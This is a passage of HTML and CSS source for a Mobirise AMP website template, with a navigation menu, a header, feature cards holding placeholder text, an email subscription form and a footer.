#333333;}.btn-white.disabled,.btn-white:disabled{color: #333333;}.btn-primary-outline,.btn-primary-outline:active,.btn-primary-outline.active{background: none;border-color: #1c6faf;color: #1c6faf;}.btn-primary-outline:hover,.btn-primary-outline:focus,.btn-primary-outline.focus{color: #ffffff;background-color: #4ea2e3;border-color: #4ea2e3;}.btn-primary-outline.disabled,.btn-primary-outline:disabled{color: #ffffff;background-color: #4ea2e3;border-color: #4ea2e3;}.btn-secondary-outline,.btn-secondary-outline:active,.btn-secondary-outline.active{background: none;border-color: #00b8e3;color: #00b8e3;}.btn-secondary-outline:hover,.btn-secondary-outline:focus,.btn-secondary-outline.focus{color: #003c4a;background-color: #4addff;border-color: #4addff;}.btn-secondary-outline.disabled,.btn-secondary-outline:disabled{color: #003c4a;background-color: #4addff;border-color: #4addff;}.btn-info-outline,.btn-info-outline:active,.btn-info-outline.active{background: none;border-color: #2c2cd7;color: #2c2cd7;}.btn-info-outline:hover,.btn-info-outline:focus,.btn-info-outline.focus{color: #ffffff;background-color: #8282e7;border-color: #8282e7;}.btn-info-outline.disabled,.btn-info-outline:disabled{color: #ffffff;background-color: #8282e7;border-color: #8282e7;}.btn-success-outline,.btn-success-outline:active,.btn-success-outline.active{background: none;border-color: #076d41;color: #076d41;}.btn-success-outline:hover,.btn-success-outline:focus,.btn-success-outline.focus{color: #ffffff;background-color: #0dcd7b;border-color: #0dcd7b;}.btn-success-outline.disabled,.btn-success-outline:disabled{color: #ffffff;background-color: #0dcd7b;border-color: #0dcd7b;}.btn-warning-outline,.btn-warning-outline:active,.btn-warning-outline.active{background: none;border-color: #434343;color: #434343;}.btn-warning-outline:hover,.btn-warning-outline:focus,.btn-warning-outline.focus{color: #ffffff;background-color: #767676;border-color: #767676;}.btn-warning-outline.disabled,.btn-warning-outline:disabled{color: #ffffff;background-color: #767676;border-color: #767676;}.btn-danger-outline,.btn-danger-outline:active,.btn-danger-outline.active{background: none;border-color: #6d6d6d;color: #6d6d6d;}.btn-danger-outline:hover,.btn-danger-outline:focus,.btn-danger-outline.focus{color: #ffffff;background-color: #a0a0a0;border-color: #a0a0a0;}.btn-danger-outline.disabled,.btn-danger-outline:disabled{color: #ffffff;background-color: #a0a0a0;border-color: #a0a0a0;}.btn-black-outline,.btn-black-outline:active,.btn-black-outline.active{background: none;border-color: #000000;color: #000000;}.btn-black-outline:hover,.btn-black-outline:focus,.btn-black-outline.focus{color: #ffffff;background-color: #333333;border-color: #333333;}.btn-black-outline.disabled,.btn-black-outline:disabled{color: #ffffff;background-color: #333333;border-color: #333333;}.btn-white-outline,.btn-white-outline:active,.btn-white-outline.active{background: none;border-color: #ffffff;color: #ffffff;}.btn-white-outline:hover,.btn-white-outline:focus,.btn-white-outline.focus{color: #333333;background-color: #ffffff;border-color: #ffffff;}.text-primary{color: #4ea2e3;}.text-secondary{color: #4addff;}.text-success{color: #0dcd7b;}.text-info{color: #8282e7;}.text-warning{color: #767676;}.text-danger{color: #a0a0a0;}.text-white{color: #ffffff;}.text-black{color: #000000;}a.text-primary:hover,a.text-primary:focus{color: #1c6faf;}a.text-secondary:hover,a.text-secondary:focus{color: #00b8e3;}a.text-success:hover,a.text-success:focus{color: #076d41;}a.text-info:hover,a.text-info:focus{color: #2c2cd7;}a.text-warning:hover,a.text-warning:focus{color: #434343;}a.text-danger:hover,a.text-danger:focus{color: #6d6d6d;}a.text-white:hover,a.text-white:focus{color: #b3b3b3;}a.text-black:hover,a.text-black:focus{color: #4d4d4d;}.alert-success{background-color: #0dcd7b;}.alert-info{background-color: #8282e7;}.alert-warning{background-color: #767676;}.alert-danger{background-color: #a0a0a0;}a,a:hover{color: #4ea2e3;}.mbr-plan-header.bg-primary .mbr-plan-subtitle,.mbr-plan-header.bg-primary .mbr-plan-price-desc{color: #feffff;}.mbr-plan-header.bg-success .mbr-plan-subtitle,.mbr-plan-header.bg-success .mbr-plan-price-desc{color: #acfad9;}.mbr-plan-header.bg-info .mbr-plan-subtitle,.mbr-plan-header.bg-info .mbr-plan-price-desc{color: #ffffff;}.mbr-plan-header.bg-warning .mbr-plan-subtitle,.mbr-plan-header.bg-warning .mbr-plan-price-desc{color: #b6b6b6;}.mbr-plan-header.bg-danger .mbr-plan-subtitle,.mbr-plan-header.bg-danger .mbr-plan-price-desc{color: #e0e0e0;}.mobirise-spinner em:nth-child(1){background: #4ea2e3;}.mobirise-spinner em:nth-child(2){background: #4addff;}.mobirise-spinner em:nth-child(3){background: #0dcd7b;}#scrollToTopMarker{display: none;}#scrollToTopButton{background-color: #4ea2e3;}#scrollToTopButton a:before{background: #ffffff;}#scrollToTopButton a:after{border-top-color: #ffffff;border-right-color: #ffffff;}.cid-s4ziAW3jEW{min-height: 80px;}.cid-s4ziAW3jEW .brand-name{color: #4ea2e3;margin: 0;}.cid-s4ziAW3jEW .hamburger span,.cid-s4ziAW3jEW .close-sidebar span{background: #4ea2e3;}.cid-s4ziAW3jEW .nav-dropdown .dropdown-menu .dropdown-item{font-weight: 400;width: 100%;text-align: inherit;}.cid-s4ziAW3jEW .navbar{min-height: 80px;background: #ffffff;}@media (max-width: 991px){.cid-s4ziAW3jEW .navbar .navbar-brand{flex-shrink: initial;}}.cid-s4ziAW3jEW .navbar-brand{flex-shrink: 0;margin-right: 0;padding: 0;}@media (min-width: 992px){.cid-s4ziAW3jEW .navbar-expand-lg .navbar-nav .nav-link{padding: 0;}.cid-s4ziAW3jEW .navbar-nav .nav-link{margin: .667em 1em;}}.cid-s4ziAW3jEW .navbar-dropdown{padding: .5rem 0;}.cid-s4ziAW3jEW .builder-sidebar,.cid-s4ziAW3jEW .collapse,.cid-s4ziAW3jEW .navbar.navbar-expand-lg .dropdown .dropdown-menu{background-color: #ffffff;}@media (max-width: 991px){.cid-s4ziAW3jEW .navbar-nav a{padding: 0.5rem 0;margin: 0 0 10px;}}.cid-s4ziAW3jEW .close-sidebar:focus{outline: 2px auto #4ea2e3;}.cid-s4ziAW3jEW amp-img{height: 45px;width: 45px;}.cid-s4ziAW3jEW amp-img img{object-fit: contain;}.cid-s4ziBQ4e3y{background-image: url("assets/images/background3.jpg");}.cid-s4ziHiw13Y{padding-top: 60px;padding-bottom: 60px;background-image: url("assets/images/05.jpg");}.cid-s4ziHiw13Y .form-block input{color: #000000;border-color: #efefef;background: #ffffff;}.cid-s4ziHiw13Y .form-block input:hover,.cid-s4ziHiw13Y .form-block input:focus{border-color: #4ea2e3;}.cid-s4ziHiw13Y .form-block input::-webkit-input-placeholder{color: rgba(0,0,0,0.5);}.cid-s4ziHiw13Y .form-block input::-moz-placeholder{color: rgba(0,0,0,0.5);}@media (min-width: 768px){.cid-s4ziHiw13Y .form-wrap{padding-left: 2rem;}}@media (max-width: 767px){.cid-s4ziHiw13Y .form-wrap{padding-top: 2rem;}}.cid-s4ziKgDWDA{padding-top: 45px;padding-bottom: 45px;background-color: #232323;}.cid-s4ziKgDWDA img{object-fit: contain;}.cid-s4ziKgDWDA .item,.cid-s4ziKgDWDA .group-title{color: #efefef;}@media (max-width: 767px){.cid-s4ziKgDWDA .items-col{margin: 2rem 0;}}
.engine{position: absolute;text-indent: -2400px;text-align: center;padding: 0;top: 0;left: -2400px;}[class*="-iconfont"]{display: inline-flex;}</style>
 
  <script async  src="https://cdn.ampproject.org/v0.js"></script>
  <script async custom-template="amp-mustache" src="https://cdn.ampproject.org/v0/amp-mustache-0.2.js"></script>
  <script async custom-element="amp-form" src="https://cdn.ampproject.org/v0/amp-form-0.1.js"></script>
  <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
  <script async custom-element="amp-sidebar" src="https://cdn.ampproject.org/v0/amp-sidebar-0.1.js"></script>
  
  
</head>
<body><amp-sidebar id="sidebar" class="cid-s4ziAW3jEW" layout="nodisplay" side="right">
        <div class="builder-sidebar" id="builder-sidebar">
            <button on="tap:sidebar.close" class="close-sidebar">
                <span></span>
                <span></span>
            </button>
        
            
            <ul class="navbar-nav nav-dropdown" data-app-modern-menu="true"><li class="nav-item dropdown">
                    <a class="nav-link link text-primary dropdown-toggle display-7" data-toggle="dropdown-submenu" aria-expanded="false">
                        Mobirise AMP</a>
                    <div class="dropdown-menu">
                        <a class="text-primary dropdown-item display-7" href="https://mobirise.com">New Item</a>
                        <a class="text-primary dropdown-item display-7" href="https://mobirise.com">New Item</a>
                    </div>
                </li>
                <li class="nav-item">
                    <a class="nav-link link text-primary display-7" href="https://mobirise.com">
                        Services</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link link text-primary display-7" href="https://mobirise.com">
                        About Us</a>
                </li></ul>
            
            <div class="navbar-buttons mbr-section-btn align-center"><a class="btn btn-sm btn-primary display-7" href="https://mobirise.com">
                  Contact Us
                </a></div>
      </div>
    </amp-sidebar>
  <section class="menu horizontal-menu cid-s4ziAW3jEW" id="menu2-0">

    
    

    <nav class="navbar navbar-dropdown navbar-expand-lg navbar-fixed-top">
       <div class="menu-container container-fluid"> 
      <div class="navbar-brand">
          <span class="navbar-logo">
              <amp-img src="assets/images/logo1.png" layout="responsive" width="45.71808510638298" height="45" alt="Mobirise" class="mobirise-loader">
                  <div placeholder="" class="placeholder">
                                <div class="mobirise-spinner">
                                    <em></em>
                                    <em></em>
                                    <em></em>
                                </div></div>
                  
              </amp-img>
          </span>
          <p class="brand-name mbr-fonts-style mbr-bold display-5">Mobirise AMP</p>
      </div>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
            
            <ul class="navbar-nav nav-dropdown" data-app-modern-menu="true"><li class="nav-item dropdown">
                    <a class="nav-link link text-primary dropdown-toggle display-7" data-toggle="dropdown-submenu" aria-expanded="false">
                        Mobirise AMP</a>
                    <div class="dropdown-menu">
                        <a class="text-primary dropdown-item display-7" href="https://mobirise.com">New Item</a>
                        <a class="text-primary dropdown-item display-7" href="https://mobirise.com">New Item</a>
                    </div>
                </li>
                <li class="nav-item">
                    <a class="nav-link link text-primary display-7" href="https://mobirise.com">
                        Services</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link link text-primary display-7" href="https://mobirise.com">
                        About Us</a>
                </li></ul>
            
            <div class="navbar-buttons mbr-section-btn align-center"><a class="btn btn-sm btn-primary display-7" href="https://mobirise.com">
                  Contact Us
                </a></div>
      </div>
      
      <button on="tap:sidebar.toggle" class="ampstart-btn hamburger sticky-but">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
    </button>
        </div>
    </nav>

  <!-- AMP plug -->
    

</section>

<section class="engine"><a href="https://mobirise.info/t">amp template</a></section><section class="header1 cid-s4ziBQ4e3y mbr-fullscreen" id="header1-1">

    

    <div class="container">
        <h1 class="mbr-section-title mbr-fonts-style align-right mbr-bold mbr-white mbr-pt-1 mbr-pb-3 display-1">
            <strong>Mobirise AMP</strong>
        </h1>
        <h3 class="mbr-section-subtitle mbr-fonts-style align-right mbr-white mbr-light mbr-pt-1 mbr-pb-3 display-2">
            Accelerate your site with AMP
        </h3>
        
        <div class="mbr-section-btn align-right">
            <a class="btn btn-md btn-primary display-4" href="https://mobirise.co">
                LEARN MORE
            </a>
        </div>
    </div>

</section>

<section class="features2 mbr-section cid-s4ziDSy097" id="features2-2">

    
    
    <div class="container">
        <div class="mbr-row mbr-jc-c">
            <div class="card mbr-col-sm-12 mbr-col-md-6 mbr-col-lg-3 md-pb">
                <div class="card-wrapper">
                    <div class="card-img">
                        <amp-img src="assets/images/05.jpg" layout="responsive" width="253.5" height="169" alt="Mobirise" class="mobirise-loader">
                            <div placeholder="" class="placeholder">
                                <div class="mobirise-spinner">
                                    <em></em>
                                    <em></em>
                                    <em></em>
                                </div></div>
                            
                        </amp-img>
                    </div>
                    <div class="card-box mbr-pt-4">
                        <h4 class="card-title mbr-fonts-style align-left mbr-light display-2 mbr-pb-1">
                            Perfomance 
                        </h4>
                        <p class="mbr-text mbr-fonts-style align-left display-4">
                            Publishers and advertisers can decide how to present their content and what technology vendors to use, all while maintaining and improving key performance indicators.
                        </p>
                        <div class="mbr-section-btn align-left">
                            <a class="btn btn-sm btn-secondary display-4" href="https://mobirise.co">
                                LEARN MORE
                            </a>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="card mbr-col-sm-12 mbr-col-md-6 mbr-col-lg-3 md-pb">
                <div class="card-wrapper">
                    <div class="card-img">
                        <amp-img src="assets/images/01.jpg" layout="responsive" height="169" width="253.5" alt="Mobirise" class="mobirise-loader">
                            <div placeholder="" class="placeholder">
                                <div class="mobirise-spinner">
                                    <em></em>
                                    <em></em>
                                    <em></em>
                                </div></div>
                            
                        </amp-img>
                    </div>
                    <div class="card-box mbr-pt-4">
                        <h4 class="card-title mbr-fonts-style align-left mbr-light display-2 mbr-pb-1">
                            Engagements
                        </h4>
                        <p class="mbr-text mbr-fonts-style align-left display-4">
                            Publishers and advertisers can decide how to present their content and what technology vendors to use, all while maintaining and improving key performance indicators.
                        </p>
                        <div class="mbr-section-btn align-left">
                            <a class="btn btn-sm btn-secondary display-4" href="https://mobirise.co">
                                LEARN MORE
                            </a>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card mbr-col-sm-12 mbr-col-md-6 mbr-col-lg-3">
                <div class="card-wrapper">
                    <div class="card-img">
                        <amp-img src="assets/images/02.jpg" layout="responsive" height="169" width="253.5" alt="Mobirise" class="mobirise-loader">
                            <div placeholder="" class="placeholder">
                                <div class="mobirise-spinner">
                                    <em></em>
                                    <em></em>
                                    <em></em>
                                </div></div>
                            
                        </amp-img>
                    </div>
                    <div class="card-box mbr-pt-4">
                        <h4 class="card-title mbr-fonts-style align-left mbr-light mbr-pb-1 display-2">
                            Flexibility
                        </h4>
                        <p class="mbr-text mbr-fonts-style align-left display-4">
                            Publishers and advertisers can decide how to present their content and what technology vendors to use, all while maintaining and improving key performance indicators.
                        </p>
                        <div class="mbr-section-btn align-left">
                            <a class="btn btn-sm btn-secondary display-4" href="https://mobirise.co">
                                LEARN MORE
                            </a>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card mbr-col-sm-12 mbr-col-md-6 mbr-col-lg-3 last-child">
                <div class="card-wrapper">
                    <div class="card-img">
                        <amp-img src="assets/images/03.jpg" layout="responsive" height="169" width="253.5" alt="Mobirise" class="mobirise-loader">
                            <div placeholder="" class="placeholder">
                                <div class="mobirise-spinner">
                                    <em></em>
                                    <em></em>
                                    <em></em>
                                </div></div>
                            
                        </amp-img>
                    </div>
                    <div class="card-box mbr-pt-4">
                        <h4 class="card-title mbr-fonts-style align-left mbr-light display-2">
                            Results
                        </h4>
                        <p class="mbr-text mbr-fonts-style align-left display-4">
                            Publishers and advertisers can decide how to present their content and what technology vendors to use, all while maintaining and improving key performance indicators.
                        </p>
                        <div class="mbr-section-btn align-left">
                            <a class="btn btn-sm btn-secondary display-4" href="https://mobirise.co">
                                LEARN MORE
                            </a>
                        </div>
                    </div>
                </div>
            </div>
            
        </div>
    </div>
</section>

<section class="Info4 cid-s4ziHiw13Y" id="info3-3">
    
    <div class="container">
        <div class="mbr-row mbr-jc-c">
            <div class="title-wrap mbr-col-md-6 mbr-col-sm-12 mbr-col-lg-8">
                <div class="title-block">
                    <h3 class="mbr-section-title mbr-fonts-style mbr-bold mbr-white mbr-pt-1 mbr-pb-3 display-1">Info With Form</h3>
                    
                    <p class="mbr-text mbr-fonts-style mbr-white mbr-pt-1 mbr-pb-3 display-7">Click on the text in the block to select it and enter the text you want to show.</p>
                    <div class="mbr-section-btn"><a class="btn btn-white-outline display-4">LEAR NOW</a></div>
                </div>
            </div>
            <div class="form-wrap mbr-col-sm-12 mbr-col-md-6 mbr-col-lg-4" data-form-type="formoid">
                <div class="form-block" data-form-type="formoid">
                    <h3 class="form-title mbr-fonts-style mbr-white mbr-light mbr-pt-1 mbr-pb-3 display-2">Subscribe Now</h3>
                    
                    <form class="mbr-form" method="post" target="_top" action-xhr="https://formoid.net/api/amp-form/push" data-form-title="Mobirise Form"><input type="hidden" name="email" data-form-email="true" value="Y/feJqlLPwFejZelWA04Kz+LAHDix9Zgw9TPywmabipY0sn8X/aIbdnT/keJxp9UI+5p5qpkN54dyEWS5pKerBvaT8XCViRn1QS9Fzd7X6LrVTYk4pJb8Xbbxt7HMOLs">
                        <div class="mbr-form-row">
                            <div submit-success="" class="mbr-col-sm-12 mbr-col-md-12">
                                <template data-form-alert="" type="amp-mustache">Subscription successful!</template>
                            </div>
                            <div submit-error="" class="mbr-col-sm-12 mbr-col-md-12">
                                <template data-form-alert="" type="amp-mustache">Failed! {{error}}</template>
                            </div>
                        </div>
                        <div class="mbr-form-row">
                            <div class="field mbr-col" data-for="form[data][0][1]">
                              <input type="hidden" name="form[data][0][0]" value="Email" id="form[data][0][0]-info3-3" data-form-field="">
                              <input class="field-input display-4" type="email" name="form[data][0][1]" data-form-field="Email" placeholder="Email" required="" id="form[data][0][1]-info3-3">
                            </div>
                            <div class="mbr-section-btn mbr-col-auto field"><button type="submit" class="btn btn-form btn-white-outline display-4">SEND</button></div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</section>

<section class="footer3 cid-s4ziKgDWDA" id="footer3-4">

    

    <div class="container">
        <div class="mbr-row mbr-jc-c">
            <div class="image-block mbr-col-sm-12 mbr-col-md-3">
                <amp-img src="assets/images/background3.jpg" layout="responsive" width="320" height="200" alt="Mobirise" class="mobirise-loader">
                    <div placeholder="" class="placeholder">
                                <div class="mobirise-spinner">
                                    <em></em>
                                    <em></em>
                                    <em></em>
                                </div></div>
                    
                </amp-img>
            </div>

            <div class="items-col mbr-col-sm-12 align-right mbr-col-md-3">
                <h3 class="mbr-fonts-style group-title mbr-bold mbr-pb-3 display-5">
                    News
                </h3>
                <div class="items">
                    
                    
                    
                <p class="item mbr-fonts-style mbr-py-1 display-7">
                        About Us
                    </p><p class="item mbr-fonts-style mbr-py-1 display-7">
                        Services
                    </p><p class="item mbr-fonts-style mbr-py-1 display-7">
                        Get In Touch
                    </p></div>
            </div>

            <div class="items-col mbr-col-sm-12 align-right mbr-col-md-3">
                <h3 class="mbr-fonts-style group-title mbr-bold mbr-pb-3 display-5">
                    Categories
                </h3>
                <div class="items">
                    
                    
                    
                <p class="item mbr-fonts-style mbr-py-1 display-7">
                        Business
                    </p><p class="item mbr-fonts-style mbr-py-1 display-7">
                        Design
                    </p><p class="item mbr-fonts-style mbr-py-1 display-7">
                        Science
                    </p></div>
            </div>

            <div class="items-col mbr-col-sm-12 align-right mbr-col-md-3">
                <h3 class="mbr-fonts-style group-title mbr-bold mbr-pb-3 display-5">
                    Links
                </h3>
                <div class="items">
                    
                    
                    
                <p class="item mbr-fonts-style mbr-py-1 display-7">
                        Website Builder
                    </p><p class="item mbr-fonts-style mbr-py-1 display-7">
                        Download for Mac
                    </p><p class="item mbr-fonts-style mbr-py-1 display-7">
                        Download for Windows
                    </p></div>
            </div>

        </div>
    </div>
</section>


  
  
</body>
</html>